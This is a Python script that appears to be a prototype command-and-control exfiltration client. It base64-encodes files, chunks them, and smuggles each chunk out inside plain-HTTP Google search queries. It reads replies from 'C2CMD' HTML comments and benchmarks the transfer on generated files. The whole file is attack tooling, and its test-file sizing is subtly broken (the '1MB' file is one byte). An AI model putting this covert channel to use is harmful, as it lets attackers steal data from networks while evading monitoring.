import socket
import re
import time
import base64
import os

GOOGLE_IP = "www.google.com"
GOOGLE_PORT = 80

CHUNK_SIZE = 800  # Safe size per URL (~1 KB after Base64)

def send_google_search(query):
    request = (
    "GET /search?q=What+is+{}+? HTTP/1.1\r\n"
    "Host: www.google.com\r\n"
    "Connection: close\r\n\r\n"
    ).format(query)
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((GOOGLE_IP, GOOGLE_PORT))
        s.sendall(request.encode())

        response = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk

    return response

def extract_response(content):
    try:
        html = content.decode(errors="ignore")
        match = re.search(r'<!-- C2CMD:(.*?) -->', html, re.DOTALL)
        if match:
            return match.group(1).strip()
    except Exception:
        pass
    return None

def send_file(filepath):
    with open(filepath, "rb") as f:
        data = base64.b64encode(f.read()).decode()

    print("[CLIENT] File size: {} base64 chars".format(len(data)))

    # Split into chunks
    chunks = [data[i:i+CHUNK_SIZE] for i in range(0, len(data), CHUNK_SIZE)]
    total_chunks = len(chunks)

    start = time.time()

    for idx, chunk in enumerate(chunks):
        payload = "{}/{}:{}".format(idx, total_chunks, chunk)
        print("[CLIENT] Sending chunk {}/{} , length {}".format(idx+1, total_chunks, len(chunk)))
        resp = send_google_search(payload)
        response = extract_response(resp)
        if response:
            print("[CLIENT] Got ACK: {}".format(response))

    end = time.time()
    elapsed = end - start
    print("[CLIENT] Sent {} in {:.2f}s".format(filepath, elapsed))

if __name__ == "__main__":
    for filename in ["file1KB.bin", "file100KB.bin", "file1MB.bin"]:
        if not os.path.exists(filename):
            with open(filename, "wb") as f:
                f.write(os.urandom(int(filename.replace("file","").replace("KB.bin","").replace("MB.bin",""))))
        send_file(filename)
